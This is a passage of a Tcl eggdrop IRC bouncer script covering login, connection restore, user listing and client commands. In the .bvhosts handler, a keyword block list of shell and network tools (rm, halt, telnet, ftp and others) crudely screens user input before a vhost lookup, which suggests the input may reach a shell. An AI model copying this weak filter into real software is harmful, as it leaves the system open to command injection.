		    utimer $h "bnc_br $s $i $c"
		    if {[bi $bnc_u($i) 2] == "Bot"} { incr h 5 } else { incr h 2 }
		}
	    }
	    318 {
		if {![string match "*bnc_ping $i*" [timers]]} { timer [bi $bnc_u($i) 8] "bnc_ping $i" }
		fileevent $s readable "bnc_recv $i $s"
		sputs $s "AWAY"
		set bnc_u($i) [lreplace $bnc_u($i) 19 19 @]
	    }
	    default {}
	}
    } else {
	fileevent $s readable "bnc_recv $i $s"
    }
    if {[valididx $i]} { putdcc $i $a }
}

proc bnc_rest {i v} {
    global bnc_u bnc_rev bnc_module_conf bnick
    if {![info exists bnc_u($i)] || ![info exists bnc_u($v)]} { return 0 }
    set o [bi $bnc_u($v) 0]
    if {![validsocket $o]} {
	pn $i 263 "Sorry, trying to recover this connection, please retry later!"
	if {[bi $bnc_u($i) 2] == "Bot"} { bnc_k $i }
	return 1
    }
    set bnc_s "$bnc_module_conf.conn.$v"
    if {[file exists $bnc_s]} { file delete -force -- $bnc_s }
    set bnc_u($i) [lreplace $bnc_u($v) 10 12 0 on 0]
    if {[bi $bnc_u($v) 10] != 0} {
	set T [ctime [bi $bnc_u($v) 10]]
	set t "away from $T"
    } else {
	set T [ctime [unixtime]]
	set t "took active connection"
    }
    bnc_log "Restored connection for [b][bi $bnc_u($i) 3][b] ( $t )"
    bnc_store $i
    unset bnc_u($v)
    fileevent $o readable "bnc_rrecv $i $o"
    if {[bi $bnc_u($i) 7] == "on"} {
	set n [join [lindex $bnc_u($i) 4]]
	set q [lindex $bnc_u($i) 17]
	if {$q == "@"} { set q Bouncer.$bnick } else { set q Bouncer.$bnick.$q }
	putdcc $i ":$q 001 $n :Wellcome to the Internet Relay Network $n"
	putdcc $i ":$q 002 $n :Your host is [bi $bnc_u($i) 5], running Bouncer System v $bnc_rev by ^Boja^"
	putdcc $i ":$q 003 $n :This server was created $T by host-bot $bnick"
	if {[lindex $bnc_u($i) 19] != "@"} { putdcc $i ":[join [lindex $bnc_u($i) 19]] NICK :$n" }
	set l "$bnc_module_conf.msg.[strl [bi $bnc_u($i) 3]].$v"
	if {[file exists $l]} {
	    set fd [open $l r]
	    while {![eof $fd]} {
		gets $fd d
		if {[eof $fd]} { break }
		set d [ctime $d]
		gets $fd m
		putdcc $i "$m ( $d )"
	    }
	    close $fd
	    file delete -force $l
	}
	sputs $o "WHOIS $n"
    }
}

#0=o 1=ip 2=lev 3=h 4=n 5=s 6=dump 7=irc 8=ping 9=verb 10=virt 11=psy 12=typ 13=id 14=r 15=ch 16=try 17=sn 18=vh 19 = oldn
proc bnc_conn i {
    global bnc_u bnc_vh bnc_irc bnc_m bnc_pass bnc_t bnc_rev bnc_pt bnc_psy bnick
    foreach d [dcclist] {
	if {[lindex $d 0] == $i} {
	    set h [lindex $d 2]
	    break
	}
    }
    #              0 1  2      3      4 5 6 7        8       9  0 1        2 3 4 5 6 7 8       9
    set bnc_u($i) "0 $h Unknow Unknow @ 0 0 $bnc_irc $bnc_pt on 0 $bnc_psy 0 @ @ @ 0 @ $bnc_vh @"
    if {$bnc_m != 0 && [llength [array names bnc_u]] > $bnc_m} {
	pn $i 263 "Sorry, Bounce System is full.. Please try later!"
	utimer 1 "bnc_k $i"
	return 0
    }
    pn $i 256 "Wellcome to [b]$bnick[b] Bounce System !"
    pn $i 256 "Your host is [myip], Bouncer version $bnc_rev by ^Boja^ !"
    pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help !"
    if {$bnc_pass != "off"} {
	pn $i 256 "Type '[b]/QUOTE .bpass <password>[b]' or '[b]/QUOTE .bquit[b]'"
    } else {
	set bnc_u($i) [lreplace $bnc_u($i) 2 2 Guest]
	if {$bnc_t == "closed"} {
	    pn $i 256 "This is a closed System, so type '[b]/QUOTE .bident <nick> <password>[b]' to let"
	    pn $i 256 "the Bouncer recognize you as a $bnick 's user, or '[b]/QUOTE .bquit[b]' to leave.."
	} else {
	    pn $i 256 "Type '[b]/QUOTE .bconn <server> \[port\] \[password \[sourceport\]\][b]' to connect to a server.."
	}
    }
    bnc_log "New incoming connection : [b]$h[b]"
    if {$bnc_pass == "off" && $bnc_t == "opened"} {
	control $i bnc_send
    } else {
	control $i bnc_acc
    }
}

proc bnc_logs h {
    global bnc_module_conf
    set r ""
    foreach l [glob -nocomplain -- $bnc_module_conf.msg.[strl $h].*] {
	set n [string range $l [expr [string last "." $l] +1] end]
	if {[string trim $n "0123456789"] == ""} {
	    lappend r $n
	}
    }
    if {$r == ""} { set r "no [b]messages[b]" }
    return "[b]$r[b]"
}

proc bnc_acc {i a} {
    global bnc_u bnc_t bnc_pass owner bnick bp bid
    if {![info exists bnc_u($i)]} { return 1 }
    if {![valididx $i] || $a == "" || [bi $a 0] == "ERROR"} {
	if {[bi $bnc_u($i) 10] == 0} {
	    bnc_log "User disconnection detected ( idx [b]$i[b] ) : killing.."
	    bnc_k $i
	}
	return 1
    }
    set c [strl [bi $a 0]]
    switch -exact -- $c {
	".bquit" {
	    pn $i 256 "Terminating Bounce connection. See you !"
	    bnc_k $i
	    return 1
	}
	"pass" {
	    set b [string range [bi $a 1] 0 [expr [string first @ [bi $a 1]] - 1]]
	    set p [string range [bi $a 1] [expr [string first @ [bi $a 1]] + 1] end]
	    set v 0
	    foreach j [array names bnc_u] {
		if {[strl [bi $bnc_u($j) 3]] == [strl $b] && [bi $bnc_u($j) 2] == "Bot"} {
		    set v 1
		    break
		}
	    }
	    if {![matchattr $b b] || ![passwdok $b $p] || !$v} {
		if {![matchattr $b b]} {
		    set q "$b is not a known bot"
		} elseif {![passwdok $b $p]} {
		    set q "bad password for $b"
		} else {
		    set q "no bounce connections ready for $b"
		}
		pn $i 263 "Incorrect connection - $q"
		bnc_log "Warning! [bi $bnc_u($i) 1] failed bot-mode connection - $q"
		bnc_k $i
		return 1
	    }
	    control $i bnc_send
	    bnc_rest $i $j
	}
	".bpass" {
	    if {[bi $bnc_u($i) 2] != "Unknow" || $bnc_pass == "off"} {
		pn $i 263 "Type '[b]/QUOTE .bident <nick> <password>[b]' or '[b]/QUOTE .bquit[b]'"
		return 0
	    }
	    if {[bi $a 1] == ""} {
		pn $i 461 "BPASS - Usage: '[b]/QUOTE .bpass <password>[b]'"
	    } else {
		if {![info exists bp($i)]} {
		    set bp($i) 1
		}
		if {[encrypt [bi $owner 0] [bi $a 1]] == $bnc_pass} {
		    unset bp($i)
		    set bnc_u($i) [lreplace $bnc_u($i) 2 2 Guest]
		    pn $i 256 "System Password [b]correct[b]! ^_^"
		    bnc_log "Accepted System Password from [b][bi $bnc_u($i) 1][b] : Guest-level granted."
		    if {$bnc_t == "closed"} {
			pn $i 256 "This is a closed System, so type '[b]/QUOTE .bident <nick> <password>[b]'"
	    		pn $i 256 "to let the Bouncer recognize you as a $bnick user, or '[b]/QUOTE .bquit[b]' to leave now.."
		    } else {
		        pn $i 256 "Type '[b]/QUOTE .bconn <server> \[port \[password \[sourceport\]\]\][b]'"
			control $i bnc_send
		    }
		} else {
		    incr bp($i)
		    if {$bp($i) > 3} {
			pn $i 263 "[b]Password incorrect![b] Intrusion-try logged."
			bnc_log "[b]Warning!!![b] Incorrect System Password from [b][bi $bnc_u($i) 1][b] : killing.."
			bnc_k $i
			unset bp($i)
			return 1
		    }
		    pn $i 263 "Password incorrect! Try again.."
		    pn $i 256 "Type '[b]/QUOTE .bpass <password>[b]' or '[b]/QUOTE .bquit[b]'"
		    bnc_log "Warning! [bi $bnc_u($i) 1] failed System password.."
		}
	    }
	}
	".bident" {
	    if {[bi $bnc_u($i) 2] != "Guest" || $bnc_t == "opened"} {
		pn $i 263 "Type '[b]/QUOTE .bpass <password>[b]' or '[b]/QUOTE .bquit[b]'"
		return 0
	    }
	    if {[bi $a 2] == ""} {
		pn $i 461 "BIDENT - Usage: '[b]/QUOTE .bident <nick> <password>[b]'"
		return 0
	    } else {
		if {![info exists bid($i)]} {
		    set bid($i) 1
		}
		if {[passwdok [bi $a 1] [bi $a 2]]} {
		    unset bid($i)
		    set aok "no"
		    foreach ch [channels] {
			if {[matchattr [bi $a 1] o|o $ch]} {
			    set aok "yes"
			}
		    }
		    if {$aok == "no"} {
			unset aok
			pn $i 263 "Sorry, you don't have the necessary flags to access"
			pn $i 263 "this System, please, contact the bot admin.. [b]Bye![b]"
			bnc_log "Rejected connection from [b][bi $a 1][b] - [bi $bnc_u($i) 1] : Acces denied."
			bnc_k $i
			return 1
		    }
		    unset aok
		    if {[matchattr [bi $a 1] n]} {
			set q Owner
			set bnc_u($i) [lreplace $bnc_u($i) 2 3 $q [bi $a 1]]
		    } else {
			set q User
			set bnc_u($i) [lreplace $bnc_u($i) 2 3 $q [bi $a 1]]
		    }
		    bnc_log "[bi $bnc_u($i) 1] gained [b]$q[b] access as [b][bi $a 1][b]"
		    pn $i 256 "Bounce System will now recognize you as [bi $a 1]."
		    pn $i 256 "Access granted for [bi $a 1] with [b]$q[b] privileges."
		    pn $i 256 "Now type '[b]/QUOTE .bconn <server> \[port \[password \[sourceport\]\]\][b]' to connect to a server"
		    set cr 0
		    foreach j [array names bnc_u] {
			if {[bi $bnc_u($j) 10] != 0 && [bi $bnc_u($j) 3] == [bi $a 1]} {
			    pn $i 256 "or '[b]/QUOTE .brestore $j[b]' to restore this connection.."
			    set cr 1
			}
		    }
		    if {!$cr} {
			set r [bnc_logs [bi $bnc_u($i) 3]]
			if {$r != "[b]no [b]messages[b][b]"} {
			    pn $i 256 "[b]Notice[b] - There are some messages logged for you"
			    pn $i 256 "( sent to your virtual clone ) : you can read them using"
			    pn $i 256 "'[b]/QUOTE BREAD <idx\#>[b]' or '.bounce read <idx\#>' from partyline."
			    pn $i 461 "BREAD - Available idx\# : [b]$r[b]"
			}
		    }
		    control $i bnc_send
		} else {
		    incr bid($i)
		    if {$bid($i) > 3} {
			pn $i 263 "[b]Identification failed! Intrusion-try logged.[b]"
			bnc_log "[b]Warning!!![b] Identification failed from [b][bi $bnc_u($i) 1][b] as [b][bi $a 1][b]: killing.."
			bnc_k $i
			unset bid($i)
			return 1
		    }
		    pn $i 263 "Identification failed ! Try again.."
		    pn $i 256 "Type '[b]/QUOTE .bident <nick> <password>[b]' or '[b]/QUOTE .bquit[b]'"
		    bnc_log "Warning! [bi $bnc_u($i) 1] failed identification as [bi $a 1].."
		}
	    }
	}
	default {
	    if {[bi $bnc_u($i) 2] == "Unknow" && $bnc_pass != "off" && $c != ".bpass" && $c != ".bquit"} {
		pn $i 256 "Type '[b]/QUOTE .bpass <password>[b]' or [b]/QUOTE .bquit[b]'"
	    } elseif {[bi $bnc_u($i) 2] == "Guest" && $bnc_t == "closed" && $c != ".bident" && $c != ".bquit"} {
		pn $i 256 "Type '[b]/QUOTE .bident <nick> <password>[b]' or '[b]/QUOTE .bquit[b]'"
	    }
	}
    }
    return 0
}

proc bnc_who {i p} {
    global bnc_u
    if {$p} {
	pb $i "----=> [b]Bouncer Users[b] <=-----"
    } else {
	pn $i 263 "----=> Bouncer Users <=-----"
    }
    set q "none"
    foreach j [array names bnc_u] {
	set q "idx [b]$j[b] - [bi $bnc_u($j) 3] \[ [bi $bnc_u($j) 2] \] - [bi $bnc_u($j) 1]"
	if {[bi $bnc_u($j) 5] != 0} {
	    set s [split [bi $bnc_u($j) 5] @]
	    append q " ( [bi $s 0] port [bi $s 1] )"
	    if {[bi $bnc_u($j) 4] != "@"} {
		append q " - [join [lindex $bnc_u($j) 4]]"
	    }
	    if {[bi $bnc_u($j) 12]} {
		append q " <spawned>"
	    } elseif {[bi $bnc_u($j) 10] != 0} {
		append q " <gone>"
	    }
	} else {
	    append q " ( No Connections )"
	}
	if {$p} { pb $i $q } else { pn $i 256 $q }
    }
    if {$q == "none"} {
	if {$p} {
	    pb $i "\[[b]$q[b]\]"
	} else {
	    pn $i 256 "\[[b]$q[b]\]"
	}
    }
}

#0=o 1=ip 2=lev 3=h 4=n 5=s 6=dump 7=irc 8=ping 9=verb 10=virt 11=psy 12=typ 13=id 14=r 15=ch 16=try 17=sn 18=vh
proc bnc_info {i w} {
    global bnc_u
    pb $i "---=> Bouncer Info - idx [b]$w[b] <=---"
    pb $i "Connection 's owner \t: [b][bi $bnc_u($w) 3][b]"
    pb $i "User 's host        \t: [b][bi $bnc_u($w) 1][b]"
    set q [lindex $bnc_u($w) 18]
    if {$q == "default"} { append q " [b]( [botvhost] )[b]" }
    pb $i "User 's virtual host\t: [b]$q[b]"
    pb $i "User access level   \t: [b][bi $bnc_u($w) 2][b]"
    if {[bi $bnc_u($w) 2] == "Owner"} {
	pb $i "Verbose command-log \t: [b][bi $bnc_u($w) 9][b]"
    }
    set q "[b]$w[b]"
    if {[bi $bnc_u($w) 10] != 0 || ![valididx $w]} {
	append q " ( virtual )"
	pb $i "User socket idx     \t: $q"
	pb $i "User is away from   \t: [ctime [bi $bnc_u($w) 10]]"
    } else {
	pb $i "User socket idx     \t: $q"
    }
    pb $i "Server socket idx   \t: [b][bi $bnc_u($w) 0][b]"
    if {[bi $bnc_u($w) 6]} { set q "enabled" } else { set q "disabled" }
    pb $i "Direct dumping mode \t: [b]$q[b]"
    if {[bi $bnc_u($w) 5] == 0} { set q "<none>" } else {
	set s [split [bi $bnc_u($w) 5] @]
	set q "[bi $s 0] [b]port[b] [bi $s 1]"
	if {[bi $s 2] != ""} {
	    append q " [b]pass[b] [bi $s 2]"
	}
    }
    if {[lindex $bnc_u($w) 16] != 0} { append q " [b]( reconnection try\# [lindex $bnc_u($w) 16] )[b]" }
    pb $i "Connected to server \t: [b]$q[b]"
    pb $i "PSY-BNC connect mode\t: [b][bi $bnc_u($w) 11][b]"
    if {[bi $bnc_u($w) 7] == "on"} { set q "yes" } else { set q "no" }
    pb $i "IRC-Type connection \t: [b]$q[b]"
    if {[bi $bnc_u($w) 7] == "on"} {
	pb $i "----=> IRC Connect Details <=----"
	if {[bi $bnc_u($w) 4] == "@"} { set q "<none>" } else { set q [join [lindex $bnc_u($w) 4]] }
	pb $i "Actual IRC nickname \t: [b]$q[b]"
	if {[lindex $bnc_u($w) 19] != "@"} { pb $i "Last IRC nickname   \t: [b][join [lindex $bnc_u($w) 19]][b]" }
	if {[bi $bnc_u($w) 13] == "@"} { set q "<none>" } else { set q [join [lindex $bnc_u($w) 13]] }
	pb $i "Actual user ident   \t: [b]$q[b]"
	if {[lindex $bnc_u($w) 14] == "@"} { set q "<none>" } else { set q [lindex $bnc_u($w) 14] }
	pb $i "Declared real name  \t: $q"
	if {[bi $bnc_u($w) 8] == 0} { set q "[b]disabled[b]" } else { set q "every [b][bi $bnc_u($w) 8][b] minutes" }
	pb $i "Current IRC-Pinging \t: $q"
	if {[lindex $bnc_u($w) 15] != "@"} {
	    set q ""
	    foreach c [lindex $bnc_u($w) 15] { lappend q [lindex $c 0] }
	    regsub -all " " $q ", " q
	    pb $i "Joined channels     \t: $q"
	}
    }
    pb $i "---------------------------------"
}

proc bnc_adj i {
    global bnc_u
    if {![info exists bnc_u($i)] || [bi $bnc_u($i) 10] == 0} { return 0 }
    set o [bi $bnc_u($i) 0]
    if {[validsocket $o]} {
	if {[bi $bnc_u($i) 2] == "Bot"} { set m "please retry later.." } else { set m "messages will be logged.." }
	sputs $o "AWAY :[boja] - I 'm away, $m"
	sputs $o "WHOIS [join [lindex $bnc_u($i) 4]]"
    }
    if {![valididx $i] && [bi $bnc_u($i) 10] != 0 && ![string match "*bnc_adj $i*" [utimers]] && [lindex $bnc_u($i) 15] != "@"} {
	utimer 90 "bnc_adj $i"
    }
}

proc bnc_store i {
    global bnc_u bnc_module_conf
    if {![info exists bnc_u($i)]} { return 0 }
    set f "$bnc_module_conf.conn.$i"
    if {[file exists $f]} { file delete -force -- $f }
    set fd [open $f w]
    puts $fd "set bnc_u($i) [list $bnc_u($i)]"
    close $fd
}

proc bnc_cc i {
    global bnc_u
    if {![info exists bnc_u($i)]} { return 0 }
    if {[bi $bnc_u($i) 5] != 0} {
	set s [bi $bnc_u($i) 0]
	if {![validsocket $s]} {
	    set bnc_u($i) [lreplace $bnc_u($i) 0 0 0]
	    if {[bi $bnc_u($i) 10] == 0} {
		bnc_disc $i "Invalid server socket - $s"
	    } else {
		if {![string match "*bnc_rc $i*" [timers]]} { bnc_rc $i }
	    }
	}
    }
    if {![string match "*bnc_cc $i*" [timers]]} { timer [expr 1 + [rand 3]] "bnc_cc $i" }
}

proc bnc_go i {
    global bnc_u bnc_module_conf max-dcc
    if {![info exists bnc_u($i)]} { return 0 }
    foreach t [timers] {
	if {[lindex $t 1] == "bnc_ping $i"} {
	    killtimer [lindex $t 2]
	}
    }
    if {[bi $bnc_u($i) 10] == 0} {
	set j [expr ${max-dcc} + [rand 9000]]
	while {[valididx $j] || [info exists bnc_u($j)]} {
	    set j [expr ${max-dcc} + [rand 9000]]
	}
	if {[bi $bnc_u($i) 12]} {
	    bnc_log "Spawning virtual clone for [bi $bnc_u($i) 3] : [b]$j[b]"
	} else {
	    bnc_log "Setting up virtual clone for [bi $bnc_u($i) 3] : [b]$j[b]"
	}
	set bnc_u($j) [lreplace $bnc_u($i) 10 10 [unixtime]]
	unset bnc_u($i)
	set f "$bnc_module_conf.conn.$i"
	if {[file exists $f]} { file delete -force -- $f }
    } else {
	set j $i
    }
    if {![string match "*bnc_cc $j*" [timers]]} { timer [expr 2 + [rand 5]] "bnc_cc $j" }
    if {[valididx $i]} { killdcc $i }
    bnc_store $j
    set o [bi $bnc_u($j) 0]
    if {[validsocket $o]} {
	fileevent $o readable "bnc_vrecv $j $o"
	if {[bi $bnc_u($j) 7] == "on"} {
	    utimer [expr 2 + [rand 5]] "bnc_adj $j"
	}
	set f "$bnc_module_conf.conn.$i"
	if {[file exists $f]} { file delete -force -- $f }
    } else {
	set bnc_u($j) [lreplace $bnc_u($j) 0 0 0]
	bnc_rc $j
    }
}

proc bbr t {
    regsub -all \\\\ $t \\\\\\ t
    regsub -all \\\{ $t \\\\\{ t
    regsub -all \\\} $t \\\\\} t
    return $t
}

proc bnc_send {i a} {
    global bnc bnc_vh bnc_pass bnc_u bnc_rev bnc_p bnc_m bnc_t bnc_l bnc_module_conf bnick botnick server servers users_port all_port
    if {![valididx $i] || $a == "" || ![info exists bnc_u($i)]} {
	if {[info exists bnc_u($i)] && [lsearch -exact "Unknow Guest" [bi $bnc_u($i) 2]] == -1 && [bi $bnc_u($i) 11] == "on" && [bi $bnc_u($i) 5] != 0} {
	    bnc_log "User disconnection detected ( idx [b]$i[b] ) : PSY-mode enabled, owning connection.."
	    if {[bi $bnc_u($i) 2] == "Bot"} { bnc_go $i } else { utimer 1 "bnc_go $i" }
	} elseif {[info exists bnc_u($i)]} {
	    bnc_log "User disconnection detected ( idx [b]$i[b] ) : killing.."
	    bnc_k $i
	}
	return 0
    }
    if {![string match "*bnc_cc $i*" [timers]]} { timer [expr 1 + [rand 3]] "bnc_cc $i" }
    set o [bi $bnc_u($i) 0]
    set h [bi $bnc_u($i) 3]
    set s [split [bi $bnc_u($i) 5] @]
    set c [strl [bi $a 0]]
    if {[bi $bnc_u($i) 6]} {
	if {[lsearch -exact ".bdump quit exit" $c] == -1} {
	    set c "bnc_dump"
	}
    }
    switch -exact -- $c {
	".bquit" {
	    pn $i 256 "Terminating Bounce connection. See you !"
	    bnc_log "\#$h\# bquit"
	    bnc_k $i
	}
	"quit" - "exit" {
	    if {[bi $bnc_u($i) 11] == "on" && [lsearch -exact "User Owner" [bi $bnc_u($i) 2]] != -1} {
		bnc_log "User disconnection detected ( idx [b]$i[b] ) : PSY-mode enabled, owning connection.."
		bnc_go $i
		return 0
	    }
	    sputs $o $a
	    if {[bi $bnc_u($i) 2] == "Bot"} {
		bnc_log "Bot-Quit detected ( idx [b]$i[b] ) : refreshing connection.."
		set bnc_u($i) [lreplace $bnc_u($i) 15 15 @]
		dosocket close $o
		bnc_go $i
		return 1
	    }
	}
	".bconn" {
	    if {$s != 0} {
		pn $i 461 "BCONN - Sorry, you are already connected to [b][bi $s 0][b] port [bi $s 1] !"
		return 0
	    }
	    set s [bi $a 1]
	    set p [bi $a 2]
	    set k [bi $a 3]
	    set l [bi $a 4]
	    set v [lindex $bnc_u($i) 18]
	    if {$s == ""} {
		pn $i 461 "BCONN - Usage: '[b]/QUOTE .bconn <server> \[port \[password \[sourceport\]\]\][b]'"
		return 0
	    }
	    if {$p == "" || [string trim $p "0123456789"] != ""} {
		set p 6667
	    }
	    if {[string trim $l "0123456789"] != ""} { set l "" }
	    set o 0
	    pn $i 256 "Connecting to [b]$s[b] port [b]$p[b] .."
	    bnc_log "\#$h\# bconn $s $p"
	    bnc_log "$h ([bi $bnc_u($i) 1]) connecting to $s port $p"
	    set o [sconn_try $s $p $v $l]
	    if {![validsocket $o]} {
		pn $i 263 "Connection failed - [b]$o[b]"
		pn $i 256 "Type '[b]/QUOTE .bconn <server> \[port \[password \[sourceport\]\]\][b]'"
		pn $i 256 "or '[b]/QUOTE .bhelp[b]' for help or '[b]/QUOTE .bquit[b]' to quit !"
		bnc_log "$h ([bi $bnc_u($i) 1]) failed connecting to $s port $p .."
		return 0
	    }
	    fconfigure $o -blocking 0 -buffering none
	    fileevent $o readable "bnc_recv $i $o"
	    set bnc_u($i) [lreplace $bnc_u($i) 0 0 $o]
	    if {$k != ""} {
		set bnc_u($i) [lreplace $bnc_u($i) 5 5 $s@$p@$k]
		sputs $o "PASS $k"
	    } else {
		set bnc_u($i) [lreplace $bnc_u($i) 5 5 $s@$p]
	    }
	    pn $i 256 "If you have connected to an IRC server, now you need to register! To do that,"
	    pn $i 256 "Type '[b]/QUOTE .breg <nick> \[ident \[realname\]\][b]'"
        }
	".bvhost" {
	    set v [bi $a 1]
	    bnc_log "\#$h\# bvhost $v"
	    if {$v == ""} {
		set q [lindex $bnc_u($i) 18]
		if {$q == "default"} { append q " [b]( [botvhost] )[b]" }
		pn $i 256 "Your current vhost is : [b]$q[b]"
		if {[lsearch -exact "User Owner" [bi $bnc_u($i) 2]] != -1} {
		    pn $i 256 "Try '[b]/QUOTE .bvhosts[b]' to have a list or '[b]/QUOTE .bvhost <newvhost>[b]' to change.."
		}
		return 0
	    }
	    set bnc_u($i) [lreplace $bnc_u($i) 18 18 $v]
	}
	".bvhosts" {
	    set w [bi $a 1]
	    if {$w != "" && [lsearch -regexp "kill rm cp mv ls halt reboot cat ftp telnet finger who uname" $w] != -1} {
		pn $i 263 "Don 't joke please.."
		return 0
	    }
	    bnc_log "\#$h\# vhosts $w"
	    set l [split [vhosts $w] \n]
	    foreach v $l {
		pn $i 256 $v
	    }
	}
	".bdisc" {
	    if {$s == 0} {
		pn $i 461 "BDISC - You are not connected to any server.."
		return 0
	    }
	    bnc_log "\#$h\# bdisc"
	    if {[validsocket $o]} {
		if {[bi $a 1] != ""} { set q [br $a 1 end] } else { set q "Bye!" }
		sputs $o "quit :$q"
		dosocket close $o
	    }
	    bnc_disc $i "[sputs $o {quit :$q}]"
	}
	".bwho" {
	    if {[lsearch -exact "Unknow Guest Bot" [bi $bnc_u($i) 2]] != -1} {
		pn $i 461 "BWHO - Sorry, you have no access to this command."
		pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help.."
		return 0
	    }
	    bnc_log "\#$h\# bwho"
	    bnc_who $i 0
	}
	".bkill" {
	    if {[bi $bnc_u($i) 2] != "Owner"} {
		pn $i 461 "BKILL - Sorry, you are not allowed to kill users.."
		pn $i 256 "Type '[b]/QUOTE .bhelp[b]' for help.."
		return 0
	    }
	    set w [bi $a 1]
	    if {$w == ""} {
		pn $i 461 "BKILL - Usage: '[b]/QUOTE .bkill <idx\#> \[reason\][b]'"
		return 0
	    }
	    if {[info exists bnc_u($w)]} {
		bnc_log "\#$h\# bkill [br $a 1 end]"
		pn $i 256 "Killing idx [b]$w[b] : [bi $bnc_u($w) 3] - [bi $bnc_u($w) 1]"
		set r [br $a 2 end]
		if {$r == ""} {
		    set r "no reason specified"
		}
		if {[valididx $w]} {
		    pn $w 263 "[b]You have been killed![b]"
		    pn $w 461 "$h - $r"
		    pn $w 256 "See you next time !"
		}
		bnc_k $w "Local kill by $h ($r)"
	    } else {
		pn $i 461 "BKILL - Sorry, idx [b]$w[b] does not match a bouncer user!"
		pn $i 256 "Try '[b]/QUOTE .bwho[b]' to have a list of '[b]/QUOTE .bhelp[b]' for help.."
	    }
	}
	".bident" {
	    if {[lsearch -exact "User Bot Owner" [bi $bnc_u($i) 2]] != -1} {
		pn $i 461 "BIDENT - I already identify you as [b]$h[b] !"
		return 0
	    }
	    set n [bi $a 1]
	    set p [bi $a 2]
	    if {$p == ""} {
		pn $i 461 "BIDENT - Usage: '[b]/QUOTE .bident <nick> <password>[b]'"
		return 0
	    }
	    if {[passwdok $n $p]} {
		if {[matchattr $n n]} { set q Owner } else { set q User }
		set bnc_u($i) [lreplace $bnc_u($i) 2 3 $q $n]
		bnc_log "[bi $bnc_u($i) 1] gained [b]$q[b] access as [b]$n[b]"
		pn $i 256 "Bounce System will now recognize you as $n."
		pn $i 256 "Access granted for $n with [b]$q[b] privileges."
	    } else {
		pn $i 263 "Identification failed !"
		bnc_log "[bi $bnc_u($i) 1]  failed identification.."
	    }
	}
	".breg" {
	    if {$s == 0} {
		pn $i 461 "BREG - You are not connected to any servers.. This is an IRC-Only"
		pn $i 461 "BREG - command, you can use it only when connected to an IRC-Server.."
		pn $i 256 "Try '[b]/QUOTE .bhelp[b]' for help.."
		return 0
	    }
	    set n [bbr [bi $a 1]]
	    set q [join [lindex $bnc_u($i) 4]]
	    if {$n == ""} {
		if {$q == "@"} {
		    pn $i 461 "BREG - Usage: '[b]/QUOTE .breg <nick> \[ident \[realname\]\][b]'"
		} else {
		    bnc_log "\#$h\# breg"
		    pn $i 256 "You are registered as [b]$q[b]"
		}
		return 0
	    }
	    if {$q != "@"} {
		pn $i 461 "BREG - You are already registered as [b]$q[b] !"
		return 0
	    }
	    bnc_log "\#$h\# breg [join $n] [br $a 2 end]"
	    set id [bbr [bi $a 2]]
	    set rn [bbr [br $a 3 end]]
	    if {$id == ""} {
		set id $n
	    }
	    if {$rn == ""} {
		set rn "Bounce System version $bnc_rev by ^Boja^"
	    }
	    pn $i 256 "Connecting you as [b][join $n]![join $id]@[bi [split [bi $bnc_u($i) 1] @] 1][b]"
	    pn $i 256 "Please, be patient..."
	    sputs $o "NICK [join $n]"
	    sputs $o "USER [join $id] +isw [join $id] :$rn"
	    set bnc_u($i) [lreplace $bnc_u($i) 4 4 $n]
	    set bnc_u($i) [lreplace $bnc_u($i) 13 14 $id $rn]
	    set t [bi $bnc_u($i) 8]
	    if {$t != 0 && ![string match "*bnc_ping $i*" [timers]]} {
		timer $t "bnc_ping $i"
	    }
	}
	".bstat" {
	    bnc_log "\#$h\# bstat"
	    pn $i 263 "-----=> Bouncer Status <=-----"
	    pn $i 256 "System version \t: [b]$bnc_rev[b]"
	    pn $i 256 "Hosting bot    \t: [b]$bnick[b] ( $botnick )"
	    set q $bnc_vh
	    if {$q == "default"} { append q " [b]( [botvhost] )[b]" }
	    pn $i 256 "Virtual host   \t: [b]$q[b]"
	    pn $i 256 "Bouncer status \t: [b]$bnc[b]"
	    pn $i 256 "Listening port \t: [b]$bnc_p[b]"
	    pn $i 256 "Max connections\t: [b]$bnc_m[b] users"
	    pn $i 256 "Access type    \t: [b]$bnc_t[b]"
	    pn $i 256 "Command logging\t: [b]$bnc_l[b]"
	    if {$bnc_pass == "off"} {
		pn $i 256 "System password\t: [b]disabled[b]"
	    } else {
	        pn $i 256 "System password\t: [b]enabled[b]"
	    }
	    pn $i 263 "--------------------------------"
	    pn $i 256 "IRC-Style mex  \t: [b][bi $bnc_u($i) 7][b]"
	    pn $i 256 "PSY-BNC mode   \t: [b][bi $bnc_u($i) 11][b]"
	    pn $i 256 "Virtual host   \t: [b][lindex $bnc_u($i) 18][b]"
	    if {[bi $bnc_u($i) 8] == 0} {
		set q "[b]disabled[b]"
	    } else {
		set q "every [b][bi $bnc_u($i) 8][b] minutes"
	    }
	    pn $i 256 "IRC-Ping time  \t: $q"	   
	    if {[bi $bnc_u($i) 6]} {
		set q "enabled"
	    } else {
		set q "disabled"
	    }
	    pn $i 256 "Direct-dumping \t: [b]$q[b]"
	    pn $i 256 "Your identity  \t: [b]$h[b] ( [bi $bnc_u($i) 1] )"
	    if {$s == 0} {
		set q "nothing"
	    } else {
		set q "[bi $s 0] [b]port[b] [bi $s 1]"
		if {[bi $s 2] != ""} {
		    append q " [b]pass[b] [bi $s 2]"
		}
	    }
	    pn $i 256 "Connected to   \t: [b]$q[b]"
	    if {[bi $bnc_u($i) 2] == "Owner"} {
		pn $i 256 "Verbose userlog\t: [b][bi $bnc_u($i) 9][b]"
	    }
	    set q ""
	    foreach j [array names bnc_u] {
		if {[bi $bnc_u($j) 10] != 0 && [bi $bnc_u($j) 3] == $h} {
		    lappend q $j
		}
	    }
	    if {$q == ""} { set q "none" }
	    pn $i 256 "Restorable conn\t: [b]$q[b]"
	    set q [bnc_logs [bi $bnc_u($i) 3]]
	    pn $i 256 "Readable mex   \t: $q"
	    if {[bi $bnc_u($i) 7] == "on"} {
		if {[bi $bnc_u($i) 4] == "@"} { set q "<none>" } else { set q [join [lindex $bnc_u($i) 4]] }
		pn $i 256 "IRC nickname   \t: [b]$q[b]"
		if {[bi $bnc_u($i) 13] == "@"} { set q "<none>" } else { set q [join [lindex $bnc_u($i) 13]] }
		pn $i 256 "IRC User ident \t: [b]$q[b]"
		if {[lindex $bnc_u($i) 14] == "@"} { set q "<none>" } else { set q [lindex $bnc_u($i) 14] }
		pn $i 256 "IRC real name  \t: $q"
		if {[lindex $bnc_u($i) 15] != "@"} {
		    set q ""
		    foreach c [lindex $bnc_u($i) 15] {
			lappend q [lindex $c 0]
		    }
